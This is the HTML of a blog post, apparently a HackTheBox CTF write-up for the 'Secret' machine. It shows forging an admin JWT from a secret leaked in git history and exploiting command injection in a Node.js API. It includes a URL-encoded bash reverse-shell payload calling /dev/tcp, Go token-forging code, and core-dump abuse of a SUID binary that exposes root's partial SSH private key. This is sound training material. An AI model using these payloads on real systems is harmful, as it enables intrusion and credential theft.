<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Secret | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there’s a custom program with SUID bit that can be exploited by crashing it.
Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/secret/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bbba2f1e3a39637b681dc4200f82f1f6ab815a81ec49741c88270268cdc40503.css integrity="sha256-u7ovHjo5Y3toHcQgD4Lx9quBWoHsSXQciCcCaM3EBQM=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.2f98e6bd63d4b4790552a2fd8fdf9121b05beb3f6652b3216af158f45de23ed4.js integrity="sha256-L5jmvWPUtHkFUqL9j9+RIbBb6z9mUrMhavFY9F3iPtQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.111.2"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Secret"><meta property="og:description" content="Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.
Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/secret/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2022-09-28T00:17:45+07:00"><meta property="article:modified_time" content="2022-09-28T00:17:45+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796.png"><meta name=twitter:title content="HackTheBox - Secret"><meta name=twitter:description content="Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.
Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Secret","item":"https://fahmifj.github.io/hackthebox/secret/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Secret","name":"HackTheBox - Secret","description":"Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there\u0026rsquo;s a custom program with SUID bit that can be exploited by crashing it.\nSkills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there’s a custom program with SUID bit that can be exploited by crashing it.\nSkills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.\n→ kali@kali «secret» «10.10.14.28» $ fscan 10.10.11.120 secret nmap -p- 10.10.11.120 | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed 's/,$//' nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 23:20 EDT Nmap scan report for 10.10.11.120 Host is up (0.073s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds Enumeration TCP 80 - Website Visiting the web on port 80 shows an online API documentation page called “DUMBDocs”.\nThe Live Demo button points to /api/, but it’s a 404.\nAt the bottom of the page, there’s a button to download the API source code and I’ll grab it.\nClicking on any of the available card menus (introduction, installation, etc.) redirects to /docs, which in this section it explains how to use the API.\nSome sections contain lorem ipsum text, some are not. That should be the hint where to go further\nTCP 3000 - Website On port 3000, it serves the same site as on port 80, but it served by node.js not NGINX.\nFrom here, I’ll look into the API.\nAPI Register According to the documentation (/docs), I can register a user by sending API request to /api/user/register.\n→ kali@kali «secret» «10.10.14.28» $ curl -H 'Content-Type: application/json' -d '{\"name\": \"syncrst\",\"email\": \"syncrst1@secret.com\",\"password\": \"syncrst\"}' http://secret.htb:3000/api/user/register {\"user\":\"syncrst\"} The response returns my username and that means the registration was successful.\nLogin -\u003e JWT token Now that I’ve been registered, I can login to get a JWT token by sending API request to /api/user/login.\n→ kali@kali «secret» «10.10.14.28» $ curl -H 'Content-Type: application/json' -d '{\"email\": \"syncrst1@secret.com\",\"password\": \"syncrst\"}' http://secret.htb:3000/api/user/login eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc The payload data of this JWT can be seen with jwt.io.\nPrivate Route The last API route in this docs is /api/priv. I can use the auth token I got on this route, where it basically just checks for user role or privilege.\n→ kali@kali «secret» «10.10.14.28» $ curl -sH 'Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc' http://secret.htb:3000/api/priv | jq { \"role\": { \"role\": \"you are normal user\", \"desc\": \"syncrst\" } } It’s still vague what to do with this API, so I’ll look into the source code.\nSource Code Analysis Directory Structure The source code has the typical structure of node.js application\n→ kali@kali «loot» «10.10.14.28» $ tree -L 2 . . ├── files.zip └── local-web ├── index.js ├── model ├── node_modules ├── package.json ├── package-lock.json ├── public ├── routes ├── src └── validations.js 7 directories, 5 files Commit History When I enter the local-web directory, my git plugin is activated, which indicates it contains git objects. It’s worth to start with git first.\nRunning git log shows the commit history, author and email address.\n→ kali@kali «local-web» «10.10.14.28» git:(master) ✗ $ git log commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b Author: dasithsv Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons commit de0a46b5107a2f4d26e348303e76d85ae4870934 Author: dasithsv Date: Fri Sep 3 11:29:19 2021 +0530 added /downloads commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb Author: dasithsv Date: Fri Sep 3 11:27:35 2021 +0530 removed swap commit 3a367e735ee76569664bf7754eaaade7c735d702 Author: dasithsv Date: Fri Sep 3 11:26:39 2021 +0530 added downloads commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8 Author: dasithsv Date: Fri Sep 3 11:25:52 2021 +0530 first commit Commit 67d8da7 seems interesting. When comparing it with commit de0a46b, there’s a deleted secret token.\n→ kali@kali «local-web» «10.10.14.28» git:(master) ✗ $ git diff 67d8da7 de0a46b | cat diff --git a/.env b/.env index 31db370..fb6f587 100644 --- a/.env +++ b/.env @@ -1,2 +1,2 @@ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' -TOKEN_SECRET = secret +TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE I’ll note that secret token.\nWeb Routes Looking at the index.js file, there are three defined routes: privRoute, authRoute, and webroute.\n...[SNIP]... const privRoute = require('./routes/private') # location: routes/private.js ...[SNIP]... // import routs const authRoute = require('./routes/auth'); # location: routes/auth.js const webroute = require('./src/routes/web') # location: src/routes/web.js ...[SNIP]... //middle ware app.use(express.json()); app.use('/api/user',authRoute) app.use('/api/', privRoute) app.use('/', webroute) webroute is the router that handles the documentation web while authRoute is the router that handles the API for user registration (/api/user/register) and login (/api/user/login) .\nAs for privRoute, it handles the API for private route (/api/priv). But, there’s a hidden route /api/logs that wasn’t listed in the API documentation. What’s more interesting is that /api/logs route is vulnerable to command injection only if I pass the verification as user theadmin.\nrouter.get('/logs', verifytoken, (req, res) =\u003e { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; # command injection exec(getLogs, (err , output) =\u003e{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) } }) Foothold Shell as dasith Forging Admin Token With the secret token obtained, I’ll write a program to forge valid JWT token for user theadmin.\npackage main import ( \"fmt\" jwt \"github.com/dgrijalva/jwt-go\" ) func main() { claims := struct { ID string `json:\"_id,omitempty\"` Name string `json:\"name,omitempty\"` Email string `json:\"email,omitempty\"` jwt.StandardClaims }{ ID: \"6114654d77f9a54e00f05777\", Name: \"theadmin\", Email: \"root@dasith.works\", } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) secret := \"gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\" signedToken, _ := token.SignedString([]byte(secret)) fmt.Printf(\"%s\", signedToken) } I’ll run the program to get the auth token.\n→ kali@kali «exploits» «10.10.14.28» $ go run forge-jwt.go eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0 Now I can verify if that token works by accessing the /api/priv route\n→ kali@kali «exploits» «10.10.14.28» $ curl -s -H 'Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0' \"http://secret.htb:3000/api/priv\" | jq { \"creds\": { \"role\": \"admin\", \"username\": \"theadmin\", \"desc\": \"welcome back admin,\" } } Command Injection With admin token, I can access the /api/logs route.\nrouter.get('/logs', verifytoken, (req, res) =\u003e { const file = req.query.file; ...[SNIP]... if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =\u003e{ if(err){ res.status(500).send(err); return } res.json(output); }) ...[SNIP]... This route takes one query: file, where its value then get passed into getLogs and eventually executed as OS command in the exec() function. Knowing this, I can inject OS command in the file query with | (pipe):\n→ kali@kali «exploits» «10.10.14.28» $ curl -s -H 'Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0' \"http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a\" \"Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\\n\" And that worked.\nthe \u003e and / symbols are URL encoded.\nReverse Shell This time I’ll setup a netcat listener and send URL-encoded bash reverse shell\n→ kali@kali «exploits» «10.10.14.28» $ curl -s -H 'Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0' \"http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22\" On my listener:\n→ kali@kali «~» «10.10.14.28» $ nc -nvlp 88 listening on [any] 88 ... connect to [10.10.14.28] from (UNKNOWN) [10.10.11.120] 46050 bash: cannot set terminal process group (2131): Inappropriate ioctl for device bash: no job control in this shell dasith@secret:~/local-web$ id id uid=1000(dasith) gid=1000(dasith) groups=1000(dasith) dasith@secret:~/local-web$ I’ll upgrade my shell so it can be more interactive\ndasith@secret:~/local-web$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null dasith@secret:~/local-web$ export TERM=xterm export TERM=xterm dasith@secret:~/local-web$ ^Z [1] + 7417 suspended nc -nvlp 88 → kali@kali «~» «10.10.14.28» $ stty raw -echo;fg [1] + 7417 continued nc -nvlp 88 dasith@secret:~/local-web$ The user flag is done here.\ndasith@secret:~$ cat user.txt c95a3f...[SNIP]... Privilege Escalation Shell as root Enumeration Doing a recursive search with the find command reveal a crash file\ndasith@secret:/opt$ find / -type f -user dasith 2\u003e/dev/null | grep -v 'proc\\|\\.npm\\|local-web' /var/crash/_opt_count.1000.crash ...[SNIP]... That naming lead me to /opt, where I find a C code, a binary, and a log file.\ndasith@secret:/$ ls /opt/ code.c count valgrind.log dasith@secret:/$ cd /opt/ dasith@secret:/opt$ ls -la total 56 drwxr-xr-x 2 root root 4096 Oct 7 10:06 . drwxr-xr-x 20 root root 4096 Oct 7 15:01 .. -rw-r--r-- 1 root root 3736 Oct 7 10:01 code.c -rw-r--r-- 1 root root 16384 Oct 7 10:01 .code.c.swp -rwsr-xr-x 1 root root 17824 Oct 7 10:03 count -rw-r--r-- 1 root root 4622 Oct 7 10:04 valgrind.log The binary drews my attention because it has SUID bit.\nWhen I run it, it asks for a file/directory and when it finishes, I’m given with an option to save the results.\ndasith@secret:/opt$ ./count Enter source file/directory name: /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y Path: /tmp/test dasith@secret:/opt$ cat /tmp/test Total characters = 33 Total words = 2 Total lines = 2 From here, I’ll look into the C code.\nSource Code Analysis Since the rests isn’t that important, I’ll start from the main function.\nIn the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: dircount if the input is a directory and filecount if the input is a file.\nint main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(\"Enter source file/directory name: \"); scanf(\"%99s\", path); getchar(); stat(path, \u0026path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); ...[SNIP]... The next thing this program do is dropping the root privilege to normal user, and then it’s forced to generate a core dump. Lastly, it’ll ask whether the user wants to save the result or not.\n...[SNIP]... // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\"Save results a file? [y/N]: \"); res = getchar(); if (res == 121 || res == 89) { printf(\"Path: \"); scanf(\"%99s\", path); FILE *fp = fopen(path, \"a\"); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\"Could not open %s for writing\\n\", path); } } return 0; } The key here is that, with core dump enabled ( prctl(PR_SET_DUMPABLE, 1)), when the program crashes, the memory state of this program will be recorded and dumped to a crash file. That file is typically used for diagnosing the program fault.\nAbuse Core Dump - Force Crash When I open a file like /root/.ssh/id_rsa in this program and if by accident it crashes, the content of that id_rsa will definitely got dumped into the crash file.\nNow the question is, how to intentionally crash this program?\nAccording to this post on StackOverFlow, sending kill -11 can trigger a crash on a program, which eventually produces a core dump.\nFirst, I will open another sessions, so I have two in total. On the first session, I’ll run the count program and keep it running in the result section.\ndasith@secret:/tmp/$ /opt/count Enter source file/directory name: /root/.ssh/id_rsa Total characters = 2602 Total words = 45 Total lines = 39 Save results a file? [y/N]: y Path: Then on the other session, you guess it, I will send a kill signal to crash the program.\ndasith@secret:/opt$ kill -11 $(pidof count) It crashes\nEnter source file/directory name: /root/.ssh/id_rsa Total characters = 2602 Total words = 45 Total lines = 39 Save results a file? [y/N]: y Path: Killed The crash file is generated under /var/crash/.\ndasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash -rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash The crash file can be unpacked into a separate files using the apport-unpack utility, which also installed in this machine.\ndasith@secret:/tmp/$ mkdir .syncrst \u0026\u0026 apport-unpack /var/crash/_opt_count.1000.crash .syncrst dasith@secret:/tmp/$ ls -la .syncrst total 440 drwxr-xr-x 2 dasith dasith 4096 Oct 31 08:43 . drwxrwxrwt 16 root root 4096 Oct 31 08:25 .. -rw-r--r-- 1 dasith dasith 5 Oct 31 08:43 Architecture -rw-r--r-- 1 dasith dasith 380928 Oct 31 08:43 CoreDump -rw-r--r-- 1 dasith dasith 1 Oct 31 08:43 CrashCounter -rw-r--r-- 1 dasith dasith 24 Oct 31 08:43 Date -rw-r--r-- 1 dasith dasith 12 Oct 31 08:43 DistroRelease -rw-r--r-- 1 dasith dasith 10 Oct 31 08:43 ExecutablePath -rw-r--r-- 1 dasith dasith 10 Oct 31 08:43 ExecutableTimestamp -rw-r--r-- 1 dasith dasith 5 Oct 31 08:43 ProblemType -rw-r--r-- 1 dasith dasith 10 Oct 31 08:43 ProcCmdline -rw-r--r-- 1 dasith dasith 10 Oct 31 08:43 ProcCwd -rw-r--r-- 1 dasith dasith 64 Oct 31 08:43 ProcEnviron -rw-r--r-- 1 dasith dasith 2144 Oct 31 08:43 ProcMaps -rw-r--r-- 1 dasith dasith 1343 Oct 31 08:43 ProcStatus -rw-r--r-- 1 dasith dasith 2 Oct 31 08:43 Signal -rw-r--r-- 1 dasith dasith 29 Oct 31 08:43 Uname -rw-r--r-- 1 dasith dasith 3 Oct 31 08:43 UserGroups The CoreDump file is the one that contains the id_rsa.\ndasith@secret:/tmp/$ cat .syncrst/CoreDump ...[SNIP]... □☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ`□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3 KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+ ...[SNIP]... RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9 6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA== -----END OPENSSH PRIVATE KEY----- ...[SNIP]... With that key, I can SSH login as root and grab the root flag!\n→ kali@kali «exploits» «10.10.14.28» $ ssh -i coredump.ssh root@10.10.11.120 The authenticity of host '10.10.11.120 (10.10.11.120)' can't be established. ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.11.120' (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 31 Oct 2021 08:16:22 AM UTC System load: 0.0 Processes: 223 Usage of /: 52.8% of 8.79GB Users logged in: 0 Memory usage: 20% IPv4 address for eth0: 10.10.11.120 Swap usage: 0% 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Oct 31 07:47:50 2021 from 10.10.14.91 root@secret:~# id uid=0(root) gid=0(root) groups=0(root) root@secret:~# cat root.txt d1d6d....[SNIP].... ","wordCount":"2349","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796.png","datePublished":"2022-09-28T00:17:45+07:00","dateModified":"2022-09-28T00:17:45+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/secret/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/articles/ title=articles>articles</a></li><li><a href=https://fahmifj.github.io/blog/ title=stories>stories</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Secret</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>September 28, 2022</span>&nbsp;&#183;&nbsp;<span class=meta-read>12 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-3000---website aria-label="TCP 3000 - Website">TCP 3000 - Website</a></li><li><a href=#api aria-label=API>API</a></li><li><a href=#source-code-analysis aria-label="Source Code Analysis">Source Code Analysis</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-dasith aria-label="Shell as dasith">Shell as dasith</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796_huab9a93656b860a0c370a67d2696647ef_171675_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796_huab9a93656b860a0c370a67d2696647ef_171675_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796_huab9a93656b860a0c370a67d2696647ef_171675_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796.png 913w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/secret/imgs/image-20220927235958796.png alt width=913 height=600></figure><p>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Forging JWT</li><li>Command injection in API</li><li>Abuse Core Dump with SUID</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>nmap</li><li>JWT tool</li><li>curl</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Full TCP port scan with <code>nmap</code> discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «secret» «10.10.14.28» 
</span></span><span class=line><span class=cl>$ fscan 10.10.11.120 secret
</span></span><span class=line><span class=cl>nmap -p- 10.10.11.120 <span class=p>|</span> grep <span class=s1>&#39;^[0-9]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f1 <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/,$//&#39;</span>
